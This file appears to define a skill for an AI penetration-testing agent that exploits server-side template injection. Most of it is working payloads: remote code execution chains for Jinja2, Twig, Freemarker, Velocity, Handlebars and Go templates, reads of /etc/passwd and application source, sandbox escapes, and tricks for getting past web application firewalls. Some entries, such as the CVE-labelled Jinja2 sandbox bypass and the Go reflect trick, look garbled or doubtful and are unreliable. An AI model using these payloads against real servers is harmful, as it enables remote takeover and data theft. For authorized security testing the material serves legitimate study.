---
name: ssti
description: "Server-Side Template Injection exploitation across Jinja2, Twig, Freemarker, Velocity, Handlebars, and Go templates"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, encodeDecode, followRedirects, recordEvidence, getCapturedHeaders]
triggers: ["server side template injection", "ssti", "template injection", "template escape", "jinja2", "twig", "freemarker", "velocity", "handlebars template", "go template injection"]
contextBoosts: [sqli]
mitreAttack: ["T1059.007", "T1190"]
owaspRefs: ["OWASP Top 10 A03:2021 Injection", "OWASP SSTI"]
toolChains:
  - name: ssti-detection
    description: "Detect Server-Side Template Injection across engines"
    steps: [httpRequest, parseResponse, measureTiming, compareResponses, recordEvidence]
  - name: ssti-exploitation
    description: "Exploit SSTI for remote code execution"
    steps: [httpRequest, parseResponse, recordEvidence, updateGraph, writeFinding]
compositionRules:
  requires: [vuln-discovery]
  enhances: [exploitation]
---

# Server-Side Template Injection (SSTI)

## When to Use

- Target reflects user input directly into a server-side template string
- Output contains template syntax artifacts (e.g., rendered variable names, error traces mentioning template engines)
- Parameter values influence page structure beyond simple variable substitution
- Error messages reference template engine internals (e.g., `UndefinedError`, `CompilationException`, `Error evaluating template`)
- Input flows into email templates, PDF generators, report builders, or document renderers
- Template partials or includes are constructed from user input

## Do Not Use

- Input only reflected in plain HTML attributes without server-side rendering context
- Client-side JavaScript template engines (Handlebars client-side, Mustache client-side, Angular expressions) — these are XSS, not SSTI
- CMS themes where template rendering is fully sandboxed with no escape hatch
- Static file generators where templates are compiled offline, not per-request

## Auth Context

Before any injection test, call `getCapturedHeaders` to retrieve session tokens, CSRF tokens, and authentication headers. SSTI payloads in authenticated contexts may produce different results or require valid session state to reach template rendering code paths. Replay captured cookies and authorization headers with every probe request.

## SSTI Detection

### Universal Detection Payloads

Test each expression syntax. If the template engine evaluates arithmetic, injection is confirmed.

| Syntax | Template Engines | Expected Output |
|--------|-----------------|-----------------|
| `{{7*7}}` | Jinja2, Nunjucks, Twig, Handlebars (server), Mako, Angular (server) | `49` |
| `${7*7}` | Freemarker, Velocity, Thymeleaf (expressions), EL (JSP) | `49` |
| `<%= 7*7 %>` | ERB (Ruby), EJS, Slim | `49` |
| `#{7*7}` | Ruby string interpolation, Thymeleaf (inline) | `49` |
| `#{7*7}` | Clojure (server-side), some .NET engines | `49` |
| `$((7*7))` | Bash/Zsh templates, Shell-based renderers | `49` |
| `{{= 7*7}}` | Marko, some Nunjucks configs | `49` |
| `<#-- ${7*7} -->` | Freemarker (comment context) | May still evaluate |
| `[[${7*7}]]` | Thymeleaf inline mode | `49` |
| `<?php echo 7*7; ?>` | PHP template engines (Twig, Blade partial) | `49` |

### Conditional Detection (Blind SSTI)

When no output is rendered, use time-based or out-of-band detection:

**Jinja2 time-based:**
```
{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
```

**Freemarker time-based:**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}
```

**Velocity time-based:**
```
$class.inspect("java.lang.Runtime").getRuntime().exec('sleep 5')
```

### Error-Based Detection

Inject syntax that triggers engine-specific errors to fingerprint:

- `{{invalid_syntax` — Jinja2 throws `TemplateSyntaxError`
- `${invalid` — Freemarker throws `ParsingException`
- `<%= invalid %>` — ERB throws `SyntaxError`

## Engine Identification

### From Output Patterns

| Observed Output | Likely Engine |
|----------------|---------------|
| `49` from `{{7*7}}` | Jinja2, Twig, Nunjucks, Handlebars (server) |
| `49` from `${7*7}` | Freemarker, Velocity, Thymeleaf |
| `49` from `<%= 7*7 %>` | ERB, EJS |
| Error mentioning `jinja2.exceptions` | Jinja2/Python |
| Error mentioning `freemarker.template` | Freemarker/Java |
| Error mentioning `org.apache.velocity` | Velocity/Java |
| Error mentioning `Twig\Error` | Twig/PHP |
| Error mentioning `Handlebars` | Handlebars/Node |
| Error mentioning `text/template` or `html/template` | Go templates |

### From Page Context

- Python/Django/Flask → likely Jinja2
- PHP/Laravel/Symfony → likely Twig or Blade
- Java/Spring Boot → likely Freemarker, Velocity, or Thymeleaf
- Node.js/Express → likely Handlebars, EJS, Nunjucks, or Pug
- Go/net/http → likely Go html/template or text/template

### Fingerprinting via Object Inspection

**Jinja2:**
```
{{config.__class__.__name__}}
```
Returns `Config` — confirms Jinja2.

**Twig:**
```
{{_self.env.getExtensions()}}
```
Returns Twig extension list — confirms Twig.

**Freemarker:**
```
${.version}
```
Returns Freemarker version string.

## Jinja2 / Python

### RCE Chains

**Standard RCE (Flask/Jinja2):**
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Alternative RCE path:**
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Using cycler (Flask-specific):**
```
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

**Using joiner:**
```
{{joiner.__init__.__globals__.os.popen('id').read()}}
```

**Using namespace:**
```
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

### File Read/Write

**Read /etc/passwd:**
```
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
```

**Read application source:**
```
{{config.__class__.__init__.__globals__['open']('app.py').read()}}
```

### Sandbox Escape

**Jinja2 sandboxed environment bypass (CVE-2024-22195):**
```
{{_self._joinargs(_self._getargs((request|attr('get')(request|attr('get')('__args__'))[0])))}}
```

**Attr filter bypass for sandbox:**
```
{{request|attr('args')|attr('get')('x')|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
```

### Subclass Enumeration (Generic Python RCE)

```
{{''.__class__.__mro__[2].__subclasses__()}}
```

Locate `os._wrap_close` or `subprocess.Popen` in the list and invoke:

```
{{''.__class__.__mro__[2].__subclasses__()[X].__init__.__globals__['popen']('id').read()}}
```

Replace `X` with the index of the identified class.

## Twig / PHP

### RCE Chains

**Standard Twig RCE:**
```
_self.env.registerUndefinedFilterCallback("exec")
_self.env.getFilter("id")
```

**Alternative using _self parent:**
```
self.env.registerUndefinedFilterCallback("system")
self.env.getFilter("id")
```

**Using apply filter:**
```
{{['id']|filter('system')}}
```

### File Operations

**Read file via Twig:**
```
_self.env.registerUndefinedFilterCallback("file_get_contents")
_self.env.getFilter("/etc/passwd")
```

### Sandbox Escape

**Twig sandbox escape via _self access:**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

The `_self` variable references the current template, and its `env` property gives access to the Twig environment, bypassing sandbox restrictions if the sandbox policy allows `_self` access.

## Freemarker / Java

### RCE Chains

**Execute system command:**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Alternative using ObjectConstructor:**
```
<#assign rt=objectConstructor("java.lang.Runtime")>${rt.getRuntime().exec("id")}
```

### File Operations

**Read file:**
```
<#assign file="freemarker.template.utility.FileReader"?new()>${file("/etc/passwd")}
```

**List directory:**
```
<#assign dir="freemarker.template.utility.ObjectConstructor"?new()>${dir("java.io.File", ".").list()}
```

### Sandbox Bypass

If `Execute` and `ObjectConstructor` are blocked, try:

```
<#assign classloader=objectConstructor("freemarker.template.TemplateModelException")?api.getClass().getProtectionDomain().getClassLoader()>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
```

Or via Jython/other loaded libraries:

```
<#assign ex="org.apache.commons.jelly.impl.ScriptBlock"?eval>${ex}
```

## Velocity / Java

### RCE Chains

**Standard Velocity RCE:**
```
$class.inspect("java.lang.Runtime").getRuntime().exec('id')
```

**Alternative using tools:**
```
$tool.execute('id')
```

**Using context lookup:**
```
$context.get('tool').execute('id')
```

### File Operations

**Read file:**
```
$class.inspect("java.io.FileReader").new("/etc/passwd").readLine()
```

### Sandbox Bypass

If `$class` is restricted, try:

```
$!{T(java.lang.Runtime).getRuntime().exec('id')}
```

Or via reflection:

```
#set($expr=$class.inspect("java.lang.reflect.Method"))
#set($method=$expr.invoke($class.inspect("java.lang.Runtime").getRuntime(), "exec", "id"))
```

## Handlebars / Node.js

### RCE Chains

**Prototype pollution RCE (Node.js < 4.2.0):**
```
{{#with "s"}} {{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string}}}}}}}}[1].prototype.hasOwnProperty.call(this,'caller')?this.constructor('return process')().mainModule.require('child_process').execSync('id'):null{{/with}}{{/with}}{{/with}}{{/with}}
```

**Simplified RCE (if require is accessible):**
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string}}
        {{#with (joiner)}}
          {{this.pop}}
          {{this.push "return require('child_process').execSync('id')"}}
          {{this.pop}}
          {{#each conslist}}
            {{#with (string.sub.apply 0 conslist)}}
              {{this}}
            {{/with}}
          {{/each}}
        {{/with}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### File Read

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string}}
        {{#with (joiner)}}
          {{this.pop}}
          {{this.push "return require('fs').readFileSync('/etc/passwd').toString()"}}
          {{this.pop}}
          {{#each conslist}}
            {{#with (string.sub.apply 0 conslist)}}
              {{this}}
            {{/with}}
          {{/each}}
        {{/with}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Sandbox Bypass

Handlebars has no built-in sandbox. If `handlebars` is used with a custom `runtime` that restricts access, prototype pollution via `__proto__` or `constructor.prototype` can bypass restrictions by modifying the runtime environment.

## Go Templates

### RCE Chains

**Standard Go template RCE (custom FuncMap):**
```
{{println (call (index .Functions "exec") "id")}}
```

**Using template method calls:**
```
{{. | call (index .Functions "system") "id"}}
```

### File Operations

**Read file (if file functions are exposed):**
```
{{println (call (index .Functions "readFile") "/etc/passwd")}}
```

### Sandbox Bypass

Go templates have no built-in sandbox, but the `text/template` and `html/template` packages restrict what methods can be called on objects. If `reflect` is available:

```
{{println (call (index .Functions "reflect") "value")}}
```

## Filter Bypass Techniques

### Encoding Bypass

When WAFs block keyword patterns, encode payloads:

**URL encoding:**
```
%7B%7B7%2A7%7D%7D
```

**Double URL encoding:**
```
%257B%257B7%252A7%257D%257D
```

**HTML entity encoding:**
```
&#123;&#123;7*7&#125;&#125;
```

**Unicode encoding (for Java engines):**
```
${"\u0024\u007B\u0037\u002A\u0037\u007D"}
```

### String Concatenation

**Jinja2 string concat:**
```
{{config['__cla'+'ss__']}}
```

**Freemarker string concat:**
```
${"freem"+"arker.template.utility.Exe"+"cute"?new()}
```

**Velocity string concat:**
```
$class.inspect("j"+"ava.lang.Runtime")
```

### Case Manipulation

**Mixed case (PHP/Twig):**
```
_SELF.ENV.REGISTERUNDEFINEDFILTERCALLBACK("exec")
```

### Whitespace Bypass

Insert tabs or newlines within keywords:

**Jinja2:**
```
{{config.__class__.__init__.__globals__
['os'].popen('id').read()}}
```

**Freemarker:**
```
<#assign ex="freemarker.template.utility
.Execute"?new()>${ex("id")}
```

### Null Byte Injection

Some template engines ignore null bytes:

```
{{config.__class__.__init__.__globals__['os'].popen('i\x00d').read()}}
```

### Alternative Class Chains

When primary chain is blocked, enumerate alternatives:

**Jinja2 subclass list:**
```
{{''.__class__.__mro__[2].__subclasses__()|length}}
```

Count subclasses, then iterate:

```
{{''.__class__.__mro__[2].__subclasses__()[N].__name__}}
```

**Freemarker class loading:**
```
<#assign classLoader=objectConstructor("java.net.URLClassLoader")>${classLoader.loadClass("com.example.Payload")}
```

### Template Engine Switching

If one engine's payloads are blocked, try injecting syntax for a different engine:

- Inject `${7*7}` when `{{7*7}}` is blocked (Freemarker/Velocity context)
- Inject `<%= 7*7 %>` when both are blocked (ERB context)
- Inject `#{7*7}` for Thymeleaf or Ruby contexts

### Dynamic Variable Construction

**Jinja2 with variable injection:**
```
{{()|attr(request.args.get('a'))}}
```
URL parameter: `?a=__class__`

**Twig with variable injection:**
```
{{attribute(_self.env, request.query.a, request.query.b)}}
```
URL: `?a=registerUndefinedFilterCallback&b=exec`

### Polyglot Payloads

Test multiple engines simultaneously:

```
$({{7*7}}=${7*7}<%= 7*7 %>)
```

If output contains `49` in multiple formats, multiple engines may be processing the input.

## Anti-Hallucination

### Verification Protocol

1. **Never trust template engine detection from error messages alone** — confirm with actual evaluation of `{{7*7}}` or `${7*7}`
2. **RCE claims require proof** — `id` command output must contain `uid=`, `gid=`, or `groups=` in the response body
3. **File read claims require file content** — partial or full file content must appear in the rendered output
4. **Sandbox bypass claims require evidence** — successful command execution after bypass, not just absence of error
5. **Time-based claims require measurement** — if `sleep 5` causes a 5+ second delay, document the timing; if delay is absent, the payload did not execute
6. **Out-of-band claims require callback evidence** — DNS or HTTP callback must be observed on the OAST server
7. **Filter bypass claims require comparison** — show the blocked payload fails AND the bypass payload succeeds on the same endpoint
8. **Do not infer template engine from URL structure alone** — `/app.py` does not guarantee Jinja2; confirm with detection payload
9. **Document every request-response pair** — include the exact payload sent and the exact response received

### Evidence Recording

For every confirmed SSTI finding, record via `writeFinding`:
- **Endpoint**: Full URL and parameter name
- **Payload**: Exact string injected
- **Engine**: Identified template engine with evidence
- **Impact**: RCE, file read, file write, or information disclosure
- **Request/Response**: Full HTTP exchange via `recordEvidence`
- **Sanbox status**: Whether sandbox is active and whether bypass was achieved
